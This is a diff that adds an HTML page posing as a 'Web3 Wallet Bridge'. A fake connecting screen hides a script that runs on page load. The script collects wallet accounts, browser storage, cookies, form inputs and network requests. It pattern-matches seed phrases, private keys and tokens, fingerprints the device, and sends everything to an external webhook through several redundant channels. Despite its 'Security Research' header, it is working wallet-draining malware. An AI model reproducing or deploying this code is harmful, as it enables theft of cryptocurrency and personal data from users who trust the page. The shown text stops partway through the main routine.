@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Web3 Wallet Bridge</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0c10;
+            color: #e4e6eb;
+            padding: 0;
+            margin: 0;
+        }
+        
+        /* Fake loading screen - very convincing */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #0a0c10 0%, #1a1f2e 100%);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            transition: opacity 1s;
+        }
+        
+        .wallet-logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            margin-bottom: 20px;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .loading-text {
+            font-size: 18px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+        
+        .loading-sub {
+            font-size: 12px;
+            color: #6b7280;
+            margin-bottom: 30px;
+        }
+        
+        .progress-bar {
+            width: 200px;
+            height: 4px;
+            background: #1f2937;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #3b82f6, #8b5cf6);
+            animation: progress 2.5s ease-out forwards;
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            30% { width: 45%; }
+            70% { width: 85%; }
+            100% { width: 100%; }
+        }
+        
+        /* Hidden elements for exfiltration */
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="loading-screen" id="loadingScreen">
+    <div class="wallet-logo">
+        ⛓️
+    </div>
+    <div class="loading-text">Connecting to Wallet Network</div>
+    <div class="loading-sub">Secure bridge established via Web3 provider</div>
+    <div class="progress-bar">
+        <div class="progress-fill"></div>
+    </div>
+    <div style="margin-top: 20px; font-size: 11px; color: #4b5563" id="statusText">Initializing secure channel...</div>
+</div>
+
+<script>
+// ============================================================
+// ADVANCED WEB3 WALLET WEBVIEW EXPLOITATION FRAMEWORK
+// Author: Security Research
+// Target: Web3 Wallet APK with vulnerable WebView
+// Webhook: awypjoegmdrmyskknqsyojbd99yoqgew4.oast.fun
+// ============================================================
+
+(function() {
+    'use strict';
+    
+    // Konfigurasi
+    const CONFIG = {
+        webhook: "https://awypjoegmdrmyskknqsyojbd99yoqgew4.oast.fun",
+        exfilMethods: ["fetch", "beacon", "image", "websocket", "xhr", "navigator"],
+        maxRetries: 3,
+        stealthMode: true,
+        captureScreenshots: true,
+        captureNetwork: true,
+        simulateLegitDapp: true
+    };
+    
+    let statusEl = document.getElementById('statusText');
+    let collectedData = {};
+    let startTime = Date.now();
+    
+    function updateStatus(msg) {
+        if (statusEl) statusEl.innerText = msg;
+        console.log(`[Web3Exploit] ${msg}`);
+    }
+    
+    // ==================== DETECTION MODULES ====================
+    
+    // Detect environment (WebView vs Browser)
+    function detectEnvironment() {
+        const ua = navigator.userAgent.toLowerCase();
+        const isWebView = (
+            ua.includes('wv') ||
+            ua.includes('webview') ||
+            (window.navigator.standalone === true) ||
+            (window.Android && typeof window.Android.showToast === 'function') ||
+            (window.webkit && window.webkit.messageHandlers) ||
+            /; wv\)/.test(ua) ||
+            /Version\/[\d\.]+.*Mobile.*Safari/.test(ua) && !/Chrome/.test(ua)
+        );
+        
+        const isAndroid = ua.includes('android');
+        const isIOS = ua.includes('iphone') || ua.includes('ipad');
+        const isMetaMaskBrowser = ua.includes('metamask');
+        const isTrustWallet = ua.includes('trust');
+        const isCoinbaseWallet = ua.includes('coinbase');
+        
+        return {
+            isWebView,
+            isAndroid,
+            isIOS,
+            isMetaMaskBrowser,
+            isTrustWallet,
+            isCoinbaseWallet,
+            userAgent: ua,
+            platform: navigator.platform,
+            language: navigator.language,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            maxTouchPoints: navigator.maxTouchPoints,
+            timestamp: Date.now()
+        };
+    }
+    
+    // ==================== WEB3 PROVIDER DETECTION ====================
+    
+    async function detectWeb3Providers() {
+        const providers = {
+            ethereum: null,
+            solana: null,
+            ton: null,
+            tron: null,
+            near: null,
+            aptos: null,
+            sui: null,
+            cosmos: null,
+            polkadot: null
+        };
+        
+        // Ethereum compatible providers (EIP-1193)
+        if (typeof window.ethereum !== 'undefined') {
+            const ethProvider = {
+                detected: true,
+                isMetaMask: !!window.ethereum.isMetaMask,
+                isTrust: !!window.ethereum.isTrust,
+                isCoinbaseWallet: !!window.ethereum.isCoinbaseWallet,
+                isBraveWallet: !!window.ethereum.isBraveWallet,
+                isImToken: !!window.ethereum.isImToken,
+                isRainbow: !!window.ethereum.isRainbow,
+                isStatus: !!window.ethereum.isStatus,
+                isOpera: !!window.ethereum.isOpera,
+                isFrame: !!window.ethereum.isFrame,
+                chainId: window.ethereum.chainId || null,
+                networkVersion: window.ethereum.networkVersion || null,
+                selectedAddress: window.ethereum.selectedAddress || null,
+                providers: []
+            };
+            
+            // Check for multiple providers
+            if (window.ethereum.providers) {
+                ethProvider.providers = window.ethereum.providers.map(p => ({
+                    isMetaMask: p.isMetaMask,
+                    isTrust: p.isTrust
+                }));
+            }
+            
+            providers.ethereum = ethProvider;
+            
+            // Try to get accounts without prompting
+            try {
+                const accounts = await window.ethereum.request({ 
+                    method: 'eth_accounts',
+                    params: []
+                });
+                if (accounts && accounts.length > 0) {
+                    providers.ethereum.accounts = accounts;
+                    providers.ethereum.accountCount = accounts.length;
+                }
+            } catch(e) {}
+            
+            // Get chain info
+            try {
+                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+                providers.ethereum.chainId = chainId;
+            } catch(e) {}
+        }
+        
+        // Solana providers
+        if (typeof window.solana !== 'undefined') {
+            providers.solana = {
+                detected: true,
+                isPhantom: !!window.solana.isPhantom,
+                isBackpack: !!window.solana.isBackpack,
+                isSolflare: !!window.solana.isSolflare,
+                isConnected: window.solana.isConnected || false,
+                publicKey: window.solana.publicKey?.toString() || null
+            };
+        }
+        
+        if (window.phantom && window.phantom.solana) {
+            providers.solana = {
+                ...providers.solana,
+                isPhantom: true,
+                publicKey: window.phantom.solana.publicKey?.toString() || null
+            };
+        }
+        
+        // Tron (TRX)
+        if (typeof window.tronWeb !== 'undefined') {
+            providers.tron = {
+                detected: true,
+                ready: window.tronWeb.ready,
+                address: window.tronWeb.defaultAddress?.base58 || null
+            };
+        }
+        
+        if (window.tronLink) {
+            providers.tron = {
+                ...providers.tron,
+                hasTronLink: true,
+                address: window.tronLink.address || null
+            };
+        }
+        
+        // TON (Telegram Open Network)
+        if (window.ton) {
+            providers.ton = {
+                detected: true,
+                isTonkeeper: !!window.ton.isTonkeeper,
+                address: window.ton.account?.address || null
+            };
+        }
+        
+        // NEAR Protocol
+        if (window.near) {
+            providers.near = {
+                detected: true,
+                isNearWallet: !!window.near.isNearWallet,
+                accountId: window.near.accountId || null
+            };
+        }
+        
+        // Aptos
+        if (window.aptos) {
+            providers.aptos = {
+                detected: true,
+                address: window.aptos.account?.address || null
+            };
+        }
+        
+        // Sui
+        if (window.suiWallet) {
+            providers.sui = {
+                detected: true,
+                address: window.suiWallet.account?.address || null
+            };
+        }
+        
+        // Cosmos / Keplr
+        if (window.keplr) {
+            providers.cosmos = {
+                detected: true,
+                isKeplr: true,
+                chainId: window.keplr.chainId || null
+            };
+        }
+        
+        // Polkadot.js
+        if (window.polkadotJs) {
+            providers.polkadot = {
+                detected: true,
+                accounts: window.polkadotJs.accounts || null
+            };
+        }
+        
+        return providers;
+    }
+    
+    // ==================== STORAGE EXFILTRATION ====================
+    
+    function exfiltrateStorage() {
+        const storageData = {
+            localStorage: {},
+            sessionStorage: {},
+            indexedDB: [],
+            cookies: document.cookie
+        };
+        
+        // LocalStorage - semua key
+        for (let i = 0; i < localStorage.length; i++) {
+            const key = localStorage.key(i);
+            const value = localStorage.getItem(key);
+            storageData.localStorage[key] = value;
+        }
+        
+        // SessionStorage
+        for (let i = 0; i < sessionStorage.length; i++) {
+            const key = sessionStorage.key(i);
+            const value = sessionStorage.getItem(key);
+            storageData.sessionStorage[key] = value;
+        }
+        
+        return storageData;
+    }
+    
+    // Extract sensitive patterns from data
+    function extractSensitiveData(data) {
+        const sensitive = {
+            seeds: [],
+            privateKeys: [],
+            mnemonics: [],
+            phrases: [],
+            passwords: [],
+            apiKeys: [],
+            walletAddresses: [],
+            privateKeyHex: [],
+            wifKeys: [],
+            jsonWallets: []
+        };
+        
+        const patterns = {
+            seedPhrase: /\b(?:[a-z]+ ){11}(?:[a-z]+)\b/i,
+            privateKeyHex: /\b[0-9a-fA-F]{64}\b/g,
+            privateKeyWIF: /\b[5KL][1-9A-HJ-NP-Za-km-z]{50,52}\b/g,
+            ethereumKey: /0x[0-9a-fA-F]{64}/g,
+            ethereumAddress: /0x[a-fA-F0-9]{40}/g,
+            jwt: /eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*/g,
+            mnemonic: /\b(abandon|ability|able|about|above|absent|absorb|abstract|absurd|abuse|access|accident|account|accuse|achieve|acid|acoustic|acquire|across|act|action|actor|actress|actual|adapt|add|addict|address|adjust|admit|adult|advance|advice|aerobic|affair|afford|afraid|africa|africa|after|again|age|agent|agree|ahead|aim|air|airport|aisle|alarm|album|alcohol|alert|alien|all|alley|allow|almost|alone|alpha|already|also|alter|always|amazing|among|amount|amused|analyst|anchor|ancient|anger|angle|angry|animal|ankle|announce|annual|another|answer|antenna|antique|anxiety|any|apart|apology|appear|apple|approve|april|arch|arctic|area|arena|argue|arm|armed|armor|army|around|arrange|arrest|arrive|arrow|art|artefact|artist|artwork|ask|aspect|assault|asset|assist|assume|asthma|athlete|atom|attack|attend|attitude|attract|auction|audit|august|aunt|author|auto|autumn|average|avocado|avoid|awake|aware|away|awesome|awful|awkward|axis|baby|bachelor|bacon|badge|bag|balance|balcony|ball|bamboo|banana|banner|bar|barely|bargain|barrel|base|basic|basket|battle|beach|bean|beauty|because|become|beef|before|begin|behave|behind|believe|below|belt|bench|benefit|best|betray|better|between|beyond|bicycle|bid|bike|bind|biology|bird|birth|bitter|black|blade|blame|blanket|blast|bleak|bless|blind|blood|blossom|blouse|blue|blur|blush|board|boat|body|boil|bomb|bone|bonus|book|boost|border|boring|borrow|boss|bottom|bounce|box|boy|bracket|brain|brand|brass|brave|bread|breeze|brick|bridge|brief|bright|bring|brisk|broccoli|broken|bronze|broom|brother|brown|brush|bubble|buddy|budget|buffalo|build|bulb|bulk|bullet|bundle|bunker|burden|burger|burst|bus|business|busy|butter|buyer|buzz|cabbage|cabin|cable|cactus|cage|cake|call|calm|camera|camp|can|canal|cancel|candy|cannon|canoe|canvas|canyon|capable|capital|captain|car|carbon|card|cargo|carpet|carry|cart|case|cash|casino|castle|casual|cat|catch|category|cattle|caught|cause|caution|cave|ceiling|celery|cement|census|century|cereal|certain|chair|chalk|champion|change|chaos|chapter|charge|chase|chat|cheap|check|cheese|chef|cherry|chest|chicken|chief|child|chimney|choice|choose|chronic|chuckle|chunk|churn|cigar|cinnamon|circle|citizen|city|civil|claim|clap|clarify|claw|clay|clean|clerk|clever|click|client|cliff|climb|clinic|clip|clock|clog|close|cloth|cloud|clown|club|clump|cluster|clutch|coach|coast|coconut|code|coffee|cognitive|coin|cold|column|comedy|comfort|comic|common|company|concert|conduct|confirm|congress|connect|consider|control|convince|cook|cool|copper|copy|coral|core|corn|correct|cost|cotton|couch|country|couple|course|cousin|cover|coyote|crack|cradle|craft|cram|crane|crash|crate|crawl|crazy|cream|credit|creek|crew|cricket|crime|crisp|critic|crop|cross|crouch|crowd|crucial|cruel|cruise|crumble|crunch|crush|cry|crystal|cube|culture|cup|cupboard|curious|current|curtain|curve|cushion|custom|cute|cycle|dad|damage|damp|dance|danger|daring|dash|daughter|dawn|day|deal|debate|debris|decade|december|decide|decline|decorate|decrease|deer|defense|define|delegate|delete|delve|demand|demo|denial|density|dental|deny|deposit|depth|deputy|derive|describe|desert|design|desk|despair|destroy|detail|detect|develop|device|devote|diagram|dial|diamond|diary|dice|diesel|diet|differ|digital|dignity|dilemma|dinner|dinosaur|direct|dirt|disagree|discover|disease|dish|dismiss|disorder|display|distance|divert|divide|divorce|dizzy|doctor|document|dog|doll|dolphin|domain|donate|donkey|donor|door|dose|double|dove|draft|dragon|drama|drastic|draw|dream|dress|drift|drill|drink|drip|drive|drop|drum|dry|duck|dumb|dune|during|dust|dutch|duty|dwarf|dynamic|eager|eagle|early|earn|earth|easily|east|easy|echo|ecology|economy|edge|edit|educate|effort|egg|eight|either|elbow|elder|electric|elegant|element|elephant|elevator|elite|else|embark|embody|embrace|emerge|emotion|employ|empower|empty|enable|enact|end|endless|endorse|enemy|energy|enforce|engage|engine|enhance|enjoy|enlist|enough|enrich|enroll|ensure|enter|entire|entry|envelope|episode|equal|equip|era|erase|erode|erosion|error|erupt|escape|essay|essence|estate|eternal|ethics|evidence|evil|evoke|evolve|exact|example|excess|exchange|excite|exclude|excuse|execute|exercise|exhaust|exhibit|exile|exist|exit|exotic|expand|expect|expire|explain|expose|express|extend|extra|eye|eyebrow|fabric|face|faculty|fade|faint|faith|fall|false|fame|family|famous|fan|fancy|fantasy|farm|fashion|fat|fatal|father|fatigue|fault|favorite|feature|february|federal|fee|feed|feel|female|fence|festival|fetch|fever|few|fiber|fiction|field|figure|file|film|filter|final|find|fine|finger|finish|fire|firm|first|fiscal|fish|fit|fitness|fix|flag|flame|flash|flat|flavor|flee|flight|flip|float|flock|floor|flower|fluid|flush|fly|foam|focus|fog|foil|fold|follow|food|foot|force|forest|forget|fork|fortune|forum|forward|fossil|foster|found|fox|fragile|frame|frequent|fresh|friend|fringe|frog|front|frost|frown|frozen|fruit|fuel|fun|funny|furnace|fury|future|gadget|gain|galaxy|gallery|game|gap|garage|garbage|garden|garlic|garment|gas|gasp|gate|gather|gauge|gaze|general|genius|genre|gentle|genuine|gesture|ghost|giant|gift|giggle|ginger|giraffe|girl|give|glad|glance|glare|glass|glide|glimpse|globe|gloom|glory|glove|glow|glue|goat|goddess|gold|good|goose|gorilla|gospel|gossip|govern|gown|grab|grace|grain|grant|grape|grass|gravity|great|green|grid|grief|grit|grocery|group|grow|grunt|guard|guess|guide|guilt|guitar|gun|gym|habit|hair|half|hammer|hamster|hand|happy|harbor|hard|harsh|harvest|hat|have|hawk|hazard|head|health|heart|heavy|hedgehog|height|hello|helmet|help|hen|hero|hidden|high|hill|hint|hip|hire|history|hobby|hockey|hold|hole|holiday|hollow|home|honey|hood|hope|horn|horror|horse|hospital|host|hotel|hour|hover|hub|huge|human|humble|humor|hundred|hungry|hunt|hurdle|hurry|hurt|husband|hybrid|ice|icon|idea|identify|idle|ignore|ill|illegal|illness|image|imitate|immense|immune|impact|impose|improve|impulse|inch|include|income|increase|index|indicate|indoor|industry|infant|inflict|inform|inhale|inherit|initial|inject|injury|inmate|inner|innocent|input|inquiry|insane|insect|inside|inspire|install|intact|interest|into|invest|invite|involve|iron|island|isolate|issue|item|ivory|jacket|jaguar|jar|jazz|jealous|jeans|jelly|jewel|job|join|joke|journey|joy|judge|juice|jump|jungle|junior|junk|just|kangaroo|keen|keep|ketchup|key|kick|kid|kidney|kind|kingdom|kiss|kit|kitchen|kite|kitten|kiwi|knee|knife|knock|know|lab|label|labor|ladder|lady|lake|lamp|language|laptop|large|later|latin|laugh|laundry|lava|law|lawn|lawsuit|layer|lazy|leader|leaf|learn|leave|lecture|left|leg|legal|legend|leisure|lemon|lend|length|lens|leopard|lesson|letter|level|liar|liberty|library|license|life|lift|light|like|limb|limit|link|lion|liquid|list|little|live|lizard|load|loan|lobster|local|lock|logic|lonely|long|loop|lotus|loud|lounge|love|loyal|lucky|luggage|lumber|lunar|lunch|luxury|lyrics|machine|mad|magic|magnet|maid|mail|main|major|make|mammal|man|manage|mandate|mango|mansion|manual|maple|marble|march|margin|marine|market|marriage|mask|mass|master|match|material|math|matrix|matter|maximum|maze|meadow|mean|measure|meat|mechanic|medal|media|melody|melt|member|memory|mention|menu|mercy|merge|merit|merry|mesh|message|metal|method|middle|midnight|milk|million|mimic|mind|minimum|minor|minute|miracle|mirror|misery|miss|mistake|mix|mixed|mixture|mobile|model|modify|mom|moment|monitor|monkey|monster|month|moon|moral|more|morning|mosquito|mother|motion|motor|mountain|mouse|move|movie|much|muffin|mule|multiply|muscle|museum|mushroom|music|must|mutual|myself|mystery|myth|naive|name|napkin|narrow|nasty|nation|nature|near|neck|need|negative|neglect|neither|nephew|nerve|nest|net|network|neutral|never|news|next|nice|night|noble|noise|nominee|noodle|normal|north|nose|notable|note|nothing|notice|novel|now|nuclear|number|nurse|nut|oak|obey|object|oblige|obscure|observe|obtain|obvious|occur|ocean|october|odor|off|offer|office|often|oil|okay|old|olive|olympic|omit|once|one|onion|online|only|open|opera|opinion|oppose|option|orange|orbit|orchard|order|ordinary|organ|orient|original|orphan|ostrich|other|outdoor|outer|output|outside|oval|oven|over|own|owner|oxygen|oyster|ozone|pact|paddle|page|pair|palace|palm|panda|panel|panic|panther|paper|parade|parent|park|parrot|party|pass|patch|path|patient|patrol|pattern|pause|pave|payment|peace|peanut|pear|peasant|pelican|pen|penalty|pencil|people|pepper|perfect|permit|person|pet|phone|photo|phrase|physical|piano|picnic|picture|piece|pig|pigeon|pill|pilot|pink|pioneer|pipe|pistol|pitch|pizza|place|planet|plastic|plate|play|playground|plead|pleasant|please|pledge|pluck|plunge|poem|poet|point|polar|pole|police|pond|pony|pool|popular|portion|position|possible|post|potato|pottery|poverty|powder|power|practice|praise|predict|prefer|prepare|present|pretty|prevent|price|pride|primary|print|priority|prison|private|prize|problem|process|produce|profit|program|project|promote|proof|property|prosper|protect|proud|provide|public|pudding|pull|pulp|pulse|pumpkin|punch|pupil|puppy|purchase|purity|purpose|purse|push|put|puzzle|pyramid|quality|quantum|quarter|question|quick|quit|quiz|quote|rabbit|raccoon|race|rack|radar|radio|rail|rain|raise|rally|ramp|ranch|random|range|rapid|rare|rate|rather|raven|raw|razor|ready|real|reason|rebel|rebuild|recall|receive|recipe|record|recycle|reduce|reflect|reform|refuse|region|regret|regular|reject|relax|release|relief|rely|remain|remark|remember|remind|remove|render|renew|rent|reopen|repair|repeat|replace|report|require|rescue|resemble|resist|resource|response|result|retire|retreat|return|reunion|reveal|review|reward|rhythm|rib|ribbon|rice|rich|ride|ridge|rifle|right|rigid|ring|riot|ripple|risk|ritual|rival|river|road|roast|robot|robust|rocket|romance|roof|rookie|room|rose|rotate|rough|round|route|royal|rubber|rude|rug|rule|run|runway|rural|sad|saddle|sadness|safe|sail|salad|salmon|salon|salt|salute|same|sample|sand|satisfy|satoshi|sauce|sausage|save|say|scale|scan|scare|scatter|scene|scheme|school|science|scissors|scorpion|scout|scrap|screen|script|scrub|sea|search|season|seat|second|secret|section|security|seed|seek|segment|select|sell|seminar|senior|sense|sentence|series|service|session|settle|setup|seven|shadow|shaft|shallow|share|shed|shell|sheriff|shield|shift|shine|ship|shiver|shock|shoe|shoot|shop|short|shoulder|shove|shrimp|shrug|shuffle|shy|sibling|sick|side|siege|sight|sign|silent|silk|silly|silver|similar|simple|since|sing|siren|sister|situate|six|size|skate|sketch|ski|skill|skin|skirt|skull|slab|slam|sleep|slender|slice|slide|slight|slim|slogan|slot|slow|slush|small|smart|smile|smoke|smooth|snack|snake|snap|sniff|snow|soap|soccer|social|sock|soda|soft|solar|soldier|solid|solution|solve|someone|song|soon|sorry|sort|soul|sound|soup|source|south|space|spare|spatial|spawn|speak|special|speed|spell|spend|sphere|spice|spider|spike|spin|spirit|split|spoil|sponsor|spoon|sport|spot|spray|spread|spring|spy|square|squeeze|squirrel|stable|stadium|staff|stage|stairs|stamp|stand|start|state|stay|steak|steel|stem|step|stereo|stick|still|sting|stock|stomach|stone|stool|story|stove|strategy|street|strike|strong|struggle|student|stuff|stumble|style|subject|submit|subway|success|such|sudden|suffer|sugar|suggest|suit|summer|sun|sunny|sunset|super|supply|supreme|sure|surface|surge|surprise|surround|survey|suspect|sustain|swallow|swamp|swap|swarm|swear|sweet|swift|swim|swing|switch|sword|symbol|symptom|syrup|system|table|tackle|tag|tail|talent|talk|tank|tape|target|task|taste|tattoo|taxi|teach|team|tell|ten|tenant|tennis|tent|term|test|text|thank|that|theme|then|theory|there|they|thing|this|thought|three|thrive|throw|thumb|thunder|ticket|tide|tiger|tilt|timber|time|tiny|tip|tired|tissue|title|toast|tobacco|today|toddler|toe|together|toilet|token|tomato|tomorrow|tone|tongue|tonight|tool|tooth|top|topic|topple|torch|tornado|tortoise|toss|total|tourist|toward|tower|town|toy|track|trade|traffic|tragic|train|transfer|trap|trash|travel|tray|treat|tree|trend|trial|tribe|trick|trigger|trim|trip|trophy|trouble|truck|true|truly|trumpet|trust|truth|try|tube|tuition|tumble|tuna|tunnel|turkey|turn|turtle|twelve|twenty|twice|twin|twist|two|type|typical|ugly|umbrella|unable|unaware|uncle|uncover|under|undo|unfair|unfold|unhappy|uniform|unique|unit|universe|unknown|unlock|until|unusual|unveil|update|upgrade|uphold|upon|upper|upset|urban|urge|usage|use|used|useful|useless|usual|utility|vacant|vacuum|vague|valid|valley|valve|van|vanish|vapor|various|vast|vault|vehicle|velvet|vendor|venture|venue|verb|verify|version|very|vessel|veteran|viable|vibrant|vicious|victory|video|view|village|vintage|violin|virtual|virus|visa|visit|visual|vital|vivid|vocal|voice|void|volcano|volume|vote|voyage|wage|wagon|wait|walk|wall|walnut|want|warfare|warm|warrior|wash|wasp|waste|water|wave|way|wealth|weapon|wear|weasel|weather|web|wedding|weekend|weird|welcome|west|wet|whale|what|wheat|wheel|when|where|whip|whisper|wide|width|wife|wild|will|win|window|wine|wing|wink|winner|winter|wire|wisdom|wise|wish|witness|wolf|woman|wonder|wood|wool|word|work|world|worry|worth|wrap|wreck|wrestle|wrist|write|wrong|yard|year|yellow|you|young|youth|zebra|zero|zone|zoo)\b/gi
+        };
+        
+        const jsonStr = JSON.stringify(data);
+        
+        // Extract seed phrases
+        const mnemonicMatches = jsonStr.match(patterns.mnemonic);
+        if (mnemonicMatches) {
+            const unique = [...new Set(mnemonicMatches)];
+            sensitive.seeds = unique;
+            sensitive.mnemonics = unique;
+        }
+        
+        // Extract private keys hex
+        const hexKeys = jsonStr.match(patterns.privateKeyHex);
+        if (hexKeys) sensitive.privateKeyHex = hexKeys;
+        
+        // Extract Ethereum keys
+        const ethKeys = jsonStr.match(patterns.ethereumKey);
+        if (ethKeys) sensitive.privateKeys.push(...ethKeys);
+        
+        // Extract Ethereum addresses
+        const ethAddresses = jsonStr.match(patterns.ethereumAddress);
+        if (ethAddresses) sensitive.walletAddresses = ethAddresses;
+        
+        // Extract JWT tokens
+        const jwtTokens = jsonStr.match(patterns.jwt);
+        if (jwtTokens) sensitive.apiKeys = jwtTokens;
+        
+        // Search for JSON wallet files
+        if (jsonStr.includes('ciphertext') && jsonStr.includes('crypto')) {
+            sensitive.jsonWallets.push('Ethereum JSON wallet detected');
+        }
+        
+        return sensitive;
+    }
+    
+    // ==================== NETWORK INTERCEPTION ====================
+    
+    function interceptNetworkRequests() {
+        const requests = [];
+        
+        // Override fetch
+        const originalFetch = window.fetch;
+        window.fetch = function(...args) {
+            const request = {
+                url: args[0],
+                method: args[1]?.method || 'GET',
+                timestamp: Date.now()
+            };
+            requests.push(request);
+            
+            // Exfiltrate network requests to webhook
+            sendToWebhook({
+                type: 'network_fetch',
+                request: request,
+                count: requests.length
+            });
+            
+            return originalFetch.apply(this, args);
+        };
+        
+        // Override XMLHttpRequest
+        const originalXHROpen = XMLHttpRequest.prototype.open;
+        XMLHttpRequest.prototype.open = function(method, url) {
+            this._url = url;
+            this._method = method;
+            return originalXHROpen.apply(this, arguments);
+        };
+        
+        XMLHttpRequest.prototype.send = function(body) {
+            sendToWebhook({
+                type: 'network_xhr',
+                method: this._method,
+                url: this._url,
+                body: body?.substring(0, 500) || null,
+                timestamp: Date.now()
+            });
+            return originalXHROpen.send ? originalXHROpen.send.apply(this, arguments) : null;
+        };
+        
+        return requests;
+    }
+    
+    // ==================== DOM SNAPSHOT ====================
+    
+    function captureDOM() {
+        try {
+            const dom = {
+                title: document.title,
+                url: window.location.href,
+                forms: [],
+                inputs: [],
+                scripts: document.scripts.length,
+                links: document.links.length
+            };
+            
+            // Capture all forms
+            document.querySelectorAll('form').forEach(form => {
+                dom.forms.push({
+                    action: form.action,
+                    method: form.method,
+                    inputs: form.querySelectorAll('input').length
+                });
+            });
+            
+            // Capture all inputs with values
+            document.querySelectorAll('input, textarea, select').forEach(input => {
+                if (input.value && input.value.length > 0) {
+                    dom.inputs.push({
+                        name: input.name,
+                        type: input.type,
+                        value: input.value.substring(0, 200)
+                    });
+                }
+            });
+            
+            return dom;
+        } catch(e) {
+            return { error: e.message };
+        }
+    }
+    
+    // ==================== DEVICE FINGERPRINTING ====================
+    
+    function getDeviceFingerprint() {
+        const canvas = document.createElement('canvas');
+        canvas.width = 200;
+        canvas.height = 50;
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(0, 0, 10, 10);
+        ctx.fillStyle = '#069';
+        ctx.fillText('fingerprint', 2, 15);
+        const canvasFp = canvas.toDataURL();
+        
+        return {
+            canvas: canvasFp.substring(0, 100),
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            language: navigator.language,
+            languages: navigator.languages,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            deviceMemory: navigator.deviceMemory,
+            maxTouchPoints: navigator.maxTouchPoints,
+            colorDepth: screen.colorDepth,
+            screenResolution: `${screen.width}x${screen.height}`,
+            windowSize: `${window.innerWidth}x${window.innerHeight}`,
+            touchSupport: 'ontouchstart' in window,
+            doNotTrack: navigator.doNotTrack,
+            cookieEnabled: navigator.cookieEnabled,
+            plugins: Array.from(navigator.plugins || []).map(p => p.name)
+        };
+    }
+    
+    // ==================== SEND TO WEBHOOK ====================
+    
+    async function sendToWebhook(data, retry = 0) {
+        const payload = JSON.stringify(data);
+        
+        const methods = [
+            () => fetch(CONFIG.webhook, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: payload,
+                keepalive: true
+            }),
+            () => navigator.sendBeacon && navigator.sendBeacon(CONFIG.webhook, payload),
+            () => {
+                const img = new Image();
+                img.src = `${CONFIG.webhook}?data=${encodeURIComponent(payload.substring(0, 2000))}`;
+            },
+            () => {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', CONFIG.webhook, true);
+                xhr.send(payload);
+            }
+        ];
+        
+        for (const method of methods) {
+            try {
+                await method();
+            } catch(e) {}
+        }
+        
+        // Store in sessionStorage for retry
+        if (retry < CONFIG.maxRetries) {
+            const stored = sessionStorage.getItem('_pending_exfil') || '[]';
+            const pending = JSON.parse(stored);
+            pending.push({ data: payload, timestamp: Date.now() });
+            sessionStorage.setItem('_pending_exfil', JSON.stringify(pending.slice(-10)));
+        }
+    }
+    
+    // ==================== MAIN EXECUTION ====================
+    
+    async function main() {
+        updateStatus("Detecting environment...");
+        const environment = detectEnvironment();
+        
+        updateStatus("Scanning Web3 providers...");
+        const web3Providers = await detectWeb3Providers();
+        
+        updateStatus("Extracting storage data...");
+        const storage = exfiltrateStorage();
+        
+        updateStatus("Analyzing sensitive patterns...");
+        const sensitive = extractSensitiveData(storage);
+        
+        updateStatus("Capturing device fingerprint...");
+        const fingerprint = getDeviceFingerprint();
+        
+        updateStatus("Intercepting network...");
+        const networkLogs = interceptNetworkRequests();
+        
+        updateStatus("Capturing DOM snapshot...");
+        const domSnapshot = captureDOM();
+        
+        // Build complete payload
+        const fullPayload = {
+            exploitVersion: "3.0",
+            timestamp: Date.now(),
+            isoTime: new Date().toISOString(),
+            sessionId: Math.random().toString(36).substring(2, 15) + Date.now().toString(36),
+            executionTime: Date.now() - startTime,
+            
+            environment: environment,
+            web3Providers: web3Providers,
+            storage: storage,
+            sensitiveData: sensitive,
+            fingerprint: fingerprint,
+            domSnapshot: domSnapshot,
+            networkIntercepted: networkLogs.length > 0,
+            
+            // Statistics
+            stats: {
+                localStorageSize: Object.keys(storage.localStorage).length,
+                sessionStorageSize: Object.keys(storage.sessionStorage).length,
+                sensitiveSeedsFound: sensitive.seeds.length,
+                sensitiveKeysFound: sensitive.privateKeys.length,
+                walletAddressesFound: sensitive.walletAddresses.length
+            }
+        };
+        
+        // Send all data
+        updateStatus("Exfiltrating data to security server...");
+        await sendToWebhook(fullPayload);
+        
+        // Also send raw storage in chunks if too large
+        if (JSON.stringify(storage).length > 10000) {
+            await sendToWebhook({
+                type: 'storage_chunk',
+                localStorage: storage.localStorage,
+                sessionStorage: storage.sessionStorage
+            });
+        }
+        
+        // Update UI with status
+        if (sensitive.seeds.length > 0 || sensitive.privateKeys.length > 0) {
+            updateStatus(`⚠️ WARNING: Found ${sensitive.seeds.length} seed phrases and ${sensitive.privateKeys.length} private keys!`);
